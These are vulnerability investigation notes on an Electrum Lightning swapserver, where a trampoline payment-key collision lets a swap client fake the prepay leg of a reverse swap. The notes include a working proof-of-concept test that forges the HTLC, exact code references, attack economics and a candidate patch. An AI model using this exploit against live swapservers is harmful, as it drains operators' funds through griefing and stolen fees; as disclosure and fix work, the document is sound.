# Trampoline payment-key collision fakes the swapserver's prepay leg

Investigation notes, 2026-08-07. Branch `swap_improvement_1` (base commit `9852eb17d`).

**Status: confirmed exploitable.** Reproduced end-to-end against the real LN test harness
(`tests/lnhelpers` — real channels, real onions, real `htlc_switch`). Nothing in the repo was
changed; the repro test and the candidate patch below were both applied, verified, and reverted.

- Victim: swapserver (reverse swap, server side)
- Impact: attacker keeps `2 * mining_fee` per swap, or griefs the server into eating funding +
  refund fees. Unboundedly repeatable. Defeats exactly the anti-griefing mechanism the
  prepayment exists for.
- Not a theft of the swap amount — the main leg is a genuine hold invoice, so the on-chain
  coins still cost the attacker the preimage.

---

## 1. The defect

Two key namespaces overlap in the single flat `received_mpp_htlcs` dict:

| what | key | where |
|---|---|---|
| our own invoices | `payment_hash + get_payment_secret(payment_hash)` | `lnworker.py:2716-2722` (`_get_payment_key`) |
| trampoline sets we **forward** | `(payment_hash + outer_onion_payment_secret).hex()` | `lnpeer.py:2188-2191` |

Both are 64 raw bytes, hex-encoded. The outer payment secret is chosen by the *sender*, and for a
swap client both halves are public — the swapserver hands them the prepay bolt11, which carries
the `payment_hash` and the `s` (payment_secret) tag. So a client can steer a forwarding set
straight into the bucket of the server's own prepay invoice.

### Why no check catches it

When the outer onion carries a `trampoline_onion_packet` and the inner onion is **non-final**,
`_check_unfulfilled_htlc` recurses (`lnpeer.py:2241-2246`) and returns at `lnpeer.py:2190`.
The invoice validation — `get_payment_info` lookup and
`constant_time_compare(payment_secret_from_onion, expected_payment_secret)` — lives at
`lnpeer.py:2248-2272`, i.e. *below* the trampoline branch. It never runs.

`total_msat` for the set then comes from the attacker's own onion
(`lnpeer.py:3048-3051`: `total_msat = total_msat_inner_onion or total_msat_outer_onion`; for a
forwarding trampoline onion the inner payload has no `payment_data`, so the attacker-chosen outer
`total_msat` wins). So 1000 msat received >= 1000 msat "total" marks the set **COMPLETE**
(`lnpeer.py:3140-3145`).

Finally `is_payment_bundle_complete` (`lnworker.py:2789-2806`) accepts *any* set found under a
bundle key whose resolution is `COMPLETE` or `SETTLING`. The main leg's gate at `lnpeer.py:3189`
opens, `delete_payment_bundle` runs, and the hold-invoice callback fires →
`SwapManager.hold_invoice_callback` → `txbatcher.add_payment_output('swaps', …)`. The server funds
the on-chain leg. The 1-sat HTLC then fails back and the prepay invoice stays `PR_UNPAID`.

### Correction to the original review (pessimistic direction)

The review says the set is "marked SETTLING because it looks like a forwarding". **SETTLING is not
required** — `COMPLETE` alone satisfies the bundle gate. So even with
`enable_htlc_forwarding = False`, which returns early at `lnpeer.py:3153-3154` and leaves the set
`COMPLETE`, the gate still opens. The review's conclusion about the `EXPERIMENTAL_LN_FORWARD_*`
flags not being a mitigation is right, and actually stronger than stated.

### Line references verified against `9852eb17d`

- `lnpeer.py:2187-2195` — forwarding payment_key derivation (trampoline at :2190, regular at :2194)
- `lnpeer.py:2210` — final-receiver trampoline key (first-stage grouping)
- `lnpeer.py:2248-2281` — the invoice checks that the trampoline branch skips
- `lnpeer.py:3140-3157` — COMPLETE / forwarding-callback logic
- `lnpeer.py:3189-3195` — the bundle gate before the hold-invoice callback
- `lnworker.py:1043` — `enable_htlc_forwarding = True` (hardcoded, "used in tests")
- `lnworker.py:2716-2722` — `_get_payment_key`
- `lnworker.py:2752-2806` — `bundle_payments` / `get_payment_bundle` / `is_payment_bundle_complete`
- `submarine_swaps.py:853` — the *only* caller of `bundle_payments`: `[payment_hash, prepay_hash]`
- `submarine_swaps.py:747-762` — `hold_invoice_callback` (funds the on-chain output)

---

## 2. Is it realistic?

Yes.

- The forged HTLC goes through `Peer.pay(..., trampoline_onion=...)` — existing Electrum code, no
  exotic tooling needed. Any client already talking to the swapserver can send it.
- No trampoline feature negotiation gates the branch; the code processes a
  `trampoline_onion_packet` TLV whenever one is present. (Moot anyway — Electrum advertises
  `OPTION_TRAMPOLINE_ROUTING_OPT_ELECTRUM`.)
- Attacker cost is zero: the 1-sat HTLC fails back either way.
- `MPP_EXPIRY = 120` (`lnworker.py:1004`) gives a wide window.

**Ordering matters, but the attacker controls it.** Sending the forged HTLC *first* failed in my
repro: the trampoline forward attempt failed instantly (forwarding disabled in the test config),
the set went `FAILED`, and only then did the main leg complete. Sending the **main leg first** —
so it sits `COMPLETE` waiting on the bundle — and the forged HTLC second works reliably. In
production the forward attempt is slower (route-finding / connecting), so the window is wider.

**Economics.** `onchain_amount_sat` derives from the full `lightning_amount_sat`, while the client
only pays `invoice_amount_sat = lightning_amount_sat - prepay_amount_sat`
(`submarine_swaps.py:810-814`). So the attacker can either:
1. complete the swap normally and pocket `2 * mining_fee`, or
2. never claim on-chain, forcing the server to refund after locktime and eat funding + refund fees.

Both repeat unboundedly.

---

## 3. Reproduction

Reproduced with the test below (drop at `tests/test_prepay_forge_repro.py`, run with
`python -m pytest tests/test_prepay_forge_repro.py -q -s`).

Against unpatched `9852eb17d`:

```
### hold-invoice callback fired (server would fund on-chain leg): True
### prepay invoice status (PR_PAID == 3): 0
E   AssertionError: VULNERABLE: hold-invoice callback fired although the prepay leg
    of the bundle was never actually paid
```

The control run (`forge=False`) does **not** fire the callback, confirming the bundle gate
otherwise works. The forged set was asserted to sit under exactly
`w2._get_payment_key(prepay_hash).hex()`.

With the patch in §4: both tests pass, and the forged set lands under `fwd:…` instead.

```python
"""Reproduction for the 'trampoline payment-key collision fakes the prepay leg' finding.

Scenario (reverse swap, server side):
  bob = swapserver. He creates a main hold invoice + a prepay invoice and bundles
  them (submarine_swaps.add_normal_swap does exactly this). He only funds the
  on-chain leg once the whole bundle is COMPLETE.
  alice = malicious swap client. She pays the main invoice for real, but "pays"
  the prepay leg with a single 1-sat *trampoline-forwarding* HTLC that reuses the
  prepay invoice's payment_hash + payment_secret (both public, they are in the
  prepay bolt11 bob handed her).
"""
import asyncio

from electrum_ecc import ECPrivkey
from electrum.lnrouter import RouteEdge, TrampolineEdge
from electrum.lnutil import LnFeatures, RECEIVED
from electrum.invoices import PR_PAID
from electrum.util import OldTaskGroup
from electrum.trampoline import create_trampoline_onion

from .test_lnpeer import TestPeer


class TestPrepayForge(TestPeer):

    async def test_prepay_leg_faked_with_trampoline_htlc(self):
        await self._run(forge=True)

    async def test_control_unpaid_prepay_leg_blocks_callback(self):
        """control: without the forged htlc the bundle gate correctly holds the callback back."""
        await self._run(forge=False)

    async def _run(self, *, forge: bool):
        graph = self.prepare_chans_and_peers_in_graph(self.GRAPH_DEFINITIONS['single_chan'])
        p1, p2 = graph.peers.values()
        w1, w2 = graph.workers.values()  # w1=alice(attacker), w2=bob(swapserver)
        chan_ab = list(w1.channels.values())[0]

        # --- bob (swapserver) sets up the swap: main hold invoice + prepay invoice, bundled
        main_lnaddr, main_payreq = self.prepare_invoice(w2, amount_msat=100_000_000)
        prepay_lnaddr, prepay_payreq = self.prepare_invoice(w2, amount_msat=20_000)  # 2 * mining_fee
        w2.bundle_payments([main_lnaddr.paymenthash, prepay_lnaddr.paymenthash])

        # bob registers the hold invoice callback for the main leg; in the real code this
        # is SwapManager.hold_invoice_callback, which funds the on-chain output.
        callback_fired = []
        seen_keys = set()
        w2._preimages.pop(main_lnaddr.paymenthash.hex())  # hold invoice: preimage not yet known

        async def hold_cb(payment_hash):
            callback_fired.append(payment_hash)
            # (the real swapserver would broadcast the funding tx here; it does not
            #  settle the htlcs until the client claims the on-chain output)

        w2.register_hold_invoice(main_lnaddr.paymenthash, hold_cb)

        # --- alice forges the prepay leg ---------------------------------------------
        # everything she needs is public: it is in the prepay bolt11 bob gave her.
        prepay_hash = prepay_lnaddr.paymenthash
        prepay_secret = prepay_lnaddr.payment_secret
        self.assertEqual(prepay_secret, w2.get_payment_secret(prepay_hash))

        def send_forged_prepay_htlc():
            # a trampoline onion that is NOT final at bob: bob is asked to forward onwards
            # to some random node id.
            carol_pubkey = ECPrivkey(b'\x11' * 32).get_public_key_bytes()
            local_height = w1.network.get_local_height()
            t_route = [
                TrampolineEdge(
                    start_node=w1.node_keypair.pubkey,
                    end_node=w2.node_keypair.pubkey,
                    fee_base_msat=0, fee_proportional_millionths=0, cltv_delta=576,
                    node_features=LnFeatures.VAR_ONION_OPT,
                ),
                TrampolineEdge(
                    start_node=w2.node_keypair.pubkey,
                    end_node=carol_pubkey,
                    fee_base_msat=0, fee_proportional_millionths=0, cltv_delta=576,
                    node_features=LnFeatures.VAR_ONION_OPT,
                ),
            ]
            t_onion, _amt, _cltv = create_trampoline_onion(
                route=t_route,
                amount_msat=1000,
                final_cltv_abs=local_height + 200,
                total_msat=1000,        # attacker-chosen
                payment_hash=prepay_hash,
                payment_secret=b'\x02' * 32,  # inner secret is irrelevant, bob only forwards
            )
            outer_route = [
                RouteEdge(
                    start_node=w1.node_keypair.pubkey,
                    end_node=w2.node_keypair.pubkey,
                    short_channel_id=chan_ab.short_channel_id,
                    fee_base_msat=0, fee_proportional_millionths=0, cltv_delta=576,
                    node_features=LnFeatures.VAR_ONION_OPT,
                ),
            ]
            return p1.pay(
                route=outer_route,
                chan=chan_ab,
                amount_msat=1000,       # 1 sat
                total_msat=1000,        # attacker-chosen
                payment_hash=prepay_hash,
                min_final_cltv_delta=200,
                payment_secret=prepay_secret,   # <-- collides with bob's own invoice key
                trampoline_onion=t_onion,
            )

        async def f():
            async with OldTaskGroup() as group:
                await group.spawn(p1._message_loop())
                await group.spawn(p1.htlc_switch())
                await group.spawn(p2._message_loop())
                await group.spawn(p2.htlc_switch())
                await asyncio.sleep(0.2)
                # attacker pays the main (hold) leg for real; it sits COMPLETE waiting
                # for the prepay leg of the bundle
                await group.spawn(w1.pay_invoice(main_payreq))
                await asyncio.sleep(1)
                # ...and then forges the prepay leg
                if forge:
                    send_forged_prepay_htlc()
                for _ in range(200):  # poll, the forged set is short-lived
                    seen_keys.update(w2.received_mpp_htlcs.keys())
                    await asyncio.sleep(0.01)
                await group.cancel_remaining()

        await f()

        # a forwarding set must never be bucketed under one of our own invoices' payment keys
        self.assertNotIn(w2._get_payment_key(prepay_hash).hex(), seen_keys)
        prepay_status = w2.get_payment_status(prepay_hash, direction=RECEIVED)
        print(f"\n### hold-invoice callback fired (server would fund on-chain leg): {bool(callback_fired)}")
        print(f"### prepay invoice status (PR_PAID == 3): {prepay_status}")
        if callback_fired:
            self.assertEqual(
                PR_PAID, prepay_status,
                msg="VULNERABLE: hold-invoice callback fired although the prepay leg "
                    "of the bundle was never actually paid")
        self.assertFalse(
            callback_fired,
            msg="VULNERABLE: hold-invoice callback fired, the swapserver would fund the "
                "on-chain leg although the prepay leg of the bundle was never paid")
```

---

## 4. Candidate fix

Two layers. Tested: repro flips to safe, `tests/test_lnpeer.py` → **133 passed**.

### Layer 1 — namespace the forwarding key

The codebase already relies on the invariant *"payment_key that isn't valid hex ⇒ never a bundle"*.
That's why the regular (non-trampoline) forwarding key `scid.hex() + ':%d' % htlc_id` is safe, and
it's what the `except ValueError` in `get_payment_bundle` (`lnworker.py:2779-2783`) exists for.
The trampoline forwarding key at `lnpeer.py:2190` is the one place that breaks the invariant, so a
`':'`-bearing prefix fits the existing design rather than introducing a new concept.

```python
# electrum/lnutil.py, next to serialize_htlc_key()

# Namespace prefix for the payment_key of htlc sets we are *forwarding* (trampoline).
# Those keys are derived from data fully chosen by the sender (payment_hash + outer onion
# payment_secret), so without a prefix they live in the same namespace as the keys of our own
# invoices (LNWallet._get_payment_key = payment_hash + payment_secret). Both of those are public
# (they are in the bolt11 we hand out), so a sender could otherwise place a forwarding set into
# the bucket of one of our own payment requests.
# note: the prefix contains ':' so such a key is never valid hex, which is what
#       LNWallet.get_payment_bundle() relies on to tell the two apart.
FORWARDING_PAYMENT_KEY_PREFIX = 'fwd:'


def serialize_forwarding_payment_key(payment_hash: bytes, outer_onion_payment_secret: bytes) -> str:
    return FORWARDING_PAYMENT_KEY_PREFIX + (payment_hash + outer_onion_payment_secret).hex()
```

```python
# electrum/lnpeer.py:2188-2191
            if outer_onion_payment_secret:
                # this is a trampoline forwarding htlc, multiple incoming trampoline htlcs can be collected.
                # note: the key must be namespaced away from _get_payment_key(), else a sender that
                #       knows one of our invoices (payment_hash and payment_secret are both public,
                #       they are in the bolt11) could make this forwarding set land in the bucket of
                #       that invoice and be mistaken for a paid one (e.g. by is_payment_bundle_complete).
                payment_key = serialize_forwarding_payment_key(payment_hash, outer_onion_payment_secret)
                return payment_key
```

Consumers checked — all treat the forwarding key as an opaque dict key:
`active_forwardings`, `save_forwarding_failure` / `get_forwarding_failure`,
`maybe_cleanup_forwarding`, `downstream_to_upstream_htlc`, `maybe_forward_htlc_set`.
The only `bytes.fromhex(payment_key)` sites are `get_payment_bundle` (already guarded) and
`lnpeer.py:3195`, which is unreachable for a forwarding key (it's in the "payment is for us" branch).

**Migration caveat:** `received_mpp_htlcs` and `active_forwardings` are persisted db dicts, so
forwarding sets in flight across an upgrade keep their old unprefixed key. Harmless — those sets
are still processed normally, and bundles are in-memory only and dissolve on restart anyway
(see the note at `lnworker.py:2757-2761`).

### Layer 2 — stop trusting a bare enum in `is_payment_bundle_complete`

Layer 1 closes the hole; layer 2 is what keeps the bundle gate honest if another key path ever
collides.

```python
# electrum/lnworker.py, in is_payment_bundle_complete's loop:
            elif not self._is_paid_set_for_own_invoice(payment_key, mpp_set):
                return False
        return True

    def _is_paid_set_for_own_invoice(self, payment_key: bytes, mpp_set: ReceivedMPPStatus) -> bool:
        """Check that this htlc set really is a set of htlcs paying one of our own payment requests
        for (at least) the requested amount.
        Defence-in-depth: a resolution of COMPLETE/SETTLING found under some payment_key is on its
        own not proof that we got paid; e.g. sets we are forwarding also reach those states.
        """
        if mpp_set.parent_set_key is not None:
            # first stage of a multi-trampoline payment; its htlcs count towards the parent set only
            return False
        payment_hash = mpp_set.get_payment_hash()
        if payment_hash is None or self._get_payment_key(payment_hash) != payment_key:
            return False
        info = self.get_payment_info(payment_hash, direction=RECEIVED)
        if info is None:
            return False
        if info.amount_msat is None:  # amount-less invoice, nothing to compare against
            return True
        # just-in-time channel opening fees are deducted from what the payer has to send
        htlc_chans = [self.get_channel_by_id(chan_id) for chan_id in set(h.channel_id for h in mpp_set.htlcs)]
        jit_opening_fees_msat = sum((chan.jit_opening_fee or 0) for chan in htlc_chans if chan)
        received_msat = sum(mpp_htlc.htlc.amount_msat for mpp_htlc in mpp_set.htlcs)
        return received_msat >= info.amount_msat - jit_opening_fees_msat
```

The JIT term matters: `_check_unfulfilled_htlc_set` marks sets COMPLETE at
`amount_msat >= total_msat - jit_opening_fees_msat` (`lnpeer.py:3140`), so a plain
`>= info.amount_msat` would break JIT-channel swaps.

---

## 5. Open follow-ups

- Should the trampoline branch reject a forwarding request whose `payment_hash` matches one of our
  own outstanding `RECEIVED` payment requests outright? Would be a cheap extra assertion, but it
  leaks a little information about which hashes we hold and is not needed once layer 1 is in.
- `enable_htlc_forwarding` (`lnworker.py:1043`) is commented "used in tests" yet is the only gate on
  the production forwarding path; worth a look independently of this finding.
- Bundles are in-memory only (`lnworker.py:2757-2761`) — orthogonal, but the same gate is what this
  attack subverts, so both deserve to be considered together if the bundle mechanism is revisited.
